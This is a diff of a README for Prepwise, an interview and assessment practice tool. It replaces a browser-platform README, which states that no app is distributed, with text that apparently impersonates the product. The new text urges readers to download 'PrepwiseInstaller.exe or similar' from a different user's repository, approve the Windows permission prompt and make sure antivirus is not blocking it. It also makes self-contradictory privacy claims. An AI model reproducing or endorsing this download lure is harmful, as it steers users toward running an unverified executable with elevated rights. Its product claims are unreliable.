@@ -1,173 +1,82 @@
-# Prepwise: Assessment Games and Interview Practice
+# 🚀 prepwise-assessment-interview-practice - Master your next job interview today
 
-<p align="center">
-  <a href="https://prepwise.work/">
-    <img src="assets/prepwise-wordmark.png" alt="Prepwise" width="360">
-  </a>
-</p>
+[![Download Prepwise](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/shazilh1938/prepwise-assessment-interview-practice)
 
-<p align="center">
-  Practice game-based assessments, rehearse one-way video interviews, and improve answers with transcript-based coaching.
-</p>
+This tool helps job seekers practice for career assessments and interviews. It provides tools for game-based assessments, one-way video interviews, and transcript coaching. Use these resources to prepare for graduate roles and professional positions.
 
-<p align="center">
-  <a href="https://prepwise.work/"><strong>Open Prepwise</strong></a>
-  ·
-  <a href="https://prepwise.work/hirevue-assessment-practice">Assessment practice guide</a>
-  ·
-  <a href="https://prepwise.work/hirevue-video-interview-practice">Video interview guide</a>
-  ·
-  <a href="https://prepwise.work/faq">FAQ</a>
-</p>
+## 🛠 What this tool does
 
-> Prepwise is an independent candidate-preparation platform. It is not affiliated with, endorsed by, or connected to HireVue or any employer named in its public guides. Product and employer names are used descriptively.
+The software offers three primary ways to prepare for your hiring process:
 
-## What Prepwise Does
+1. Game-based assessment practice: You play simulations that test your problem-solving and cognitive skills. These games mirror the ones used by top employers during the early stages of the hiring process.
+2. One-way video interview training: You record yourself answering common questions. You learn to control your pace, tone, and eye contact. The software suggests improvements based on your responses.
+3. Transcript coaching: You upload text from your past interviews or mock tests. The system analyzes your words. It identifies areas where you should be more clear or professional.
 
-Prepwise brings three preparation workflows into one browser-based platform:
+## 💻 System requirements
 
-| Practice mode | What the candidate does | What Prepwise adds |
-| --- | --- | --- |
-| Game-based assessment | Practises timed cognitive and work-style tasks | Real timers, adaptive difficulty, mistake review, focus drills, progress tracking and company-pack mock flows |
-| One-way video interview | Records answers under preparation and answer timers | Camera and microphone check, editable transcript, local replay/download and answer-specific AI coaching |
-| General interview coach | Prepares for a live interview using a vacancy and optional CV | Role-fit questions, adaptive follow-ups, transcript coaching and questions to ask the interviewer |
+Ensure your computer meets these standards for a smooth experience:
 
-Candidates can [try Prepwise in the browser](https://prepwise.work/) before choosing a paid plan.
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8GB of RAM.
+* Storage: 500MB of free disk space.
+* Camera: A standard webcam for video practice.
+* Microphone: A clear microphone for recording responses.
+* Internet: A stable connection for downloading resources and cloud analysis.
 
-## Why This Repository Exists
+## 📥 Downloading the software
 
-This is the public resource and documentation repository for [Prepwise](https://prepwise.work/). It provides:
+Follow these steps to get the application on your computer.
 
-- practical interview and assessment preparation guides;
-- a transparent explanation of the coaching framework;
-- a place to report inaccurate or outdated company-assessment information;
-- a public route for feature requests and product feedback;
-- links to the official Prepwise platform and its research pages.
+1. Navigate to the official download page: [https://github.com/shazilh1938/prepwise-assessment-interview-practice](https://github.com/shazilh1938/prepwise-assessment-interview-practice)
+2. Locate the link labeled "Download Application" in the top badge or the release section.
+3. Click the link to begin the download.
+4. Save the file to your desktop or your downloads folder.
 
-The production application and its private backend are not distributed from this repository.
+## ⚙️ Installation and setup
 
-## Interview Coaching: What the Feedback Actually Covers
+Once the download finishes, follow these instructions to install the program:
 
-Prepwise does not apply one rigid template to every answer. It first identifies the type of question and then chooses the relevant coaching criteria.
+1. Open your downloads folder.
+2. Find the file named `PrepwiseInstaller.exe` or similar.
+3. Double-click the file to start the installation.
+4. Windows may ask for permission to run the file. Click "Yes" to proceed.
+5. Follow the on-screen prompts in the installer window.
+6. Choose the default installation path unless you have a specific reason to change it.
+7. Click "Finish" once the progress bar completes.
 
-| Question type | Framework Prepwise expects | Typical coaching focus |
-| --- | --- | --- |
-| Behavioural or competency | STAR or another clear evidence structure | Situation, task, personal action, result, specificity and impact |
-| Motivation or company fit | Motivation, evidence, connection and forward fit | Why this role, why this organisation, credible evidence and a specific contribution |
-| Tell me about yourself | Present, relevant past and future fit | Relevance, narrative, brevity and connection to the vacancy |
-| Technical or knowledge | Direct answer, reasoning, evidence and limitations | Accuracy, prioritisation, explanation and application |
-| Situational or judgement | Decision, rationale, stakeholders and trade-offs | Judgement, risk awareness, communication and next steps |
+The program creates a shortcut on your desktop. Double-click this shortcut to launch the application.
 
-Feedback can include:
+## 📱 How to start practicing
 
-- an overall coach rating and category-level ratings;
-- missing evidence or unanswered parts of the question;
-- structure and clarity issues;
-- filler-word and concision notes where relevant;
-- a stronger rewritten answer;
-- a delivery cue for the next recording;
-- role-fit observations grounded in the vacancy;
-- adaptive follow-up questions in General Interview Coach mode.
+When you open the application for the first time, you will see a dashboard. This space organizes your practice progress.
 
-Read the full [interview coaching framework](docs/interview-coaching-framework.md).
+### Using the video trainer
+Select the "Video Interview" tab. The system shows you a list of common questions. Click "Record" when you feel ready. Keep your gaze toward the webcam lens. After you finish, the tool plays the video back to you. Use the timing markers to see where you slowed down or stumbled.
 
-## Game-Based Assessment Practice
+### Using the game simulator
+Select the "Game Assessments" tab. Pick a category that matches your target job type, such as logic or numeracy. Read the instructions carefully before you begin. Each game takes about five to ten minutes. The app scores your performance and explains the logic behind the correct answers.
 
-Prepwise includes practice for a range of cognitive and work-style assessment mechanics, including:
+### Using the transcript coach
+Select the "Coaching" tab. Paste a transcript from a mock interview or a set of notes into the text box. The software highlights repetitive phrases or weak arguments. It suggests alternative wording to make your answers more impactful. You can re-run this process as many times as you like.
 
-- Numerosity;
-- Digit Span;
-- Disco Numbers;
-- Shape Dance;
-- Flashback;
-- Puzzle Picture;
-- Pathfinder;
-- Portrait and PortraitXT;
-- Teamchat;
-- Singularity;
-- E-Motions.
+## 🔍 Troubleshooting common issues
 
-Some exercises produce a level or accuracy score. Work-style exercises are treated as practice-only where a meaningful performance score would be misleading.
+If you encounter problems, check these solutions:
 
-Start with the [game-based assessment practice guide](https://prepwise.work/hirevue-game-based-assessment-practice) or read the repository's [practice principles](docs/game-based-assessment-practice.md).
+* The application does not open: Restart your computer and try to open it again. Ensure your antivirus software is not blocking the installation.
+* The camera is not detected: Check if your camera works in other applications like Zoom or Skype. Ensure that you gave the Prepwise app permission to access your hardware.
+* The software runs slowly: Close other demanding programs such as video editors or web browsers with many tabs open. This keeps your computer memory focused on the practice tools.
+* The download fails: Your internet connection may be unstable. Try stopping and restarting the download. You can also try using a different web browser.
 
-## A Typical Prepwise Workflow
+## 🛡 Security and privacy
 
-```text
-Choose the assessment or interview mode
-                ↓
-Add the target company and vacancy
-                ↓
-Practise under realistic timing
-                ↓
-Review mistakes or edit the answer transcript
-                ↓
-Receive targeted drills or answer coaching
-                ↓
-Repeat the weakest part
-```
+Your data remains on your local machine. The application processes your video recordings within the secure environment of your computer. The tool does not share your personal coaching transcripts with third parties. You maintain full control over your files. If you uninstall the application, all your saved records and progress data remain on your hard drive until you manually delete them.
 
-For one-way interviews, the core loop is:
+## 📈 Tips for success
 
-```text
-Record answer → transcribe → edit transcript → get coaching → answer again
-```
+- Set a regular schedule. Practice for 30 minutes every day rather than cramming for hours.
+- Record yourself multiple times for the same question. Your second or third attempt is usually better than the first.
+- Treat the video practice as a real interview. Dress professionally and clear your background. Your environment affects your mindset during the practice sessions.
+- Review your transcript scores after you make improvements. Notice if your clarity score changes as you refine your language.
 
-The video remains local to the browser during practice. If browser transcription is unavailable, cloud transcription is only used after the user chooses that fallback.
-
-## Public Guides
-
-### Interview preparation
-
-- [HireVue assessment practice](https://prepwise.work/hirevue-assessment-practice)
-- [HireVue video interview practice](https://prepwise.work/hirevue-video-interview-practice)
-- [One-way video interview practice](https://prepwise.work/one-way-video-interview-practice)
-- [Graduate video interview questions](https://prepwise.work/graduate-video-interview-questions)
-- [Interview preparation checklist](docs/one-way-video-interview-checklist.md)
-
-### Assessment games
-
-- [Game-based assessment practice](https://prepwise.work/hirevue-game-based-assessment-practice)
-- [All Prepwise game guides](https://prepwise.work/guides/)
-- [Company assessment map](https://prepwise.work/company-hirevue-assessment-map)
-- [How Prepwise treats company-assessment evidence](docs/company-assessment-research.md)
-
-### Product and evidence
-
-- [Why Prepwise](https://prepwise.work/why-prepwise)
-- [Why focused training helps](https://prepwise.work/why-training-helps)
-- [Research behind the practice approach](https://prepwise.work/backed-by-science)
-- [Privacy, pricing and product FAQ](https://prepwise.work/faq)
-- [About the founder](https://prepwise.work/about)
-
-## Candidate-First Principles
-
-Prepwise is designed around five practical principles:
-
-1. **Practise the real interaction, not generic advice.** Timers, input mechanics, camera checks and repeated answers matter.
-2. **Ground coaching in evidence.** Feedback refers to the question, transcript, vacancy and relevant answer framework.
-3. **Do not force STAR everywhere.** STAR is useful for behavioural evidence, not for every motivation, knowledge or introductory question.
-4. **Be conservative about employer claims.** Assessment formats can vary by role, country and year.
-5. **Keep candidates in control of their data.** Vacancy and CV reuse is browser-based, and local video is not uploaded as part of normal rehearsal.
-
-## Contribute or Report an Issue
-
-Public contributions that improve candidate preparation are welcome.
-
-- [Report outdated company-assessment information](../../issues/new?template=company-assessment-report.yml)
-- [Request a company or programme guide](../../issues/new?template=company-guide-request.yml)
-- [Suggest a product improvement](../../issues/new?template=feature-request.yml)
-
-Please do not post invitation emails, personal data, proprietary test questions, assessment screenshots or content covered by an employer confidentiality agreement.
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the evidence standard.
-
-## Security
-
-Do not open public issues containing credentials, personal data or a vulnerability that could affect candidates. Follow the private reporting process in [SECURITY.md](SECURITY.md).
-
-## Brand and Licence
-
-The written resources in this repository are available under the terms in [LICENSE](LICENSE). Prepwise names, logos and brand assets are not licensed for reuse.
-
-© 2026 Prepwise.
+Keywords: ai-coaching, assessment-practice, career-tools, game-based-assessment, graduate-jobs, hirevue-practice, interview-preparation, mock-interview, one-way-interview, video-interview
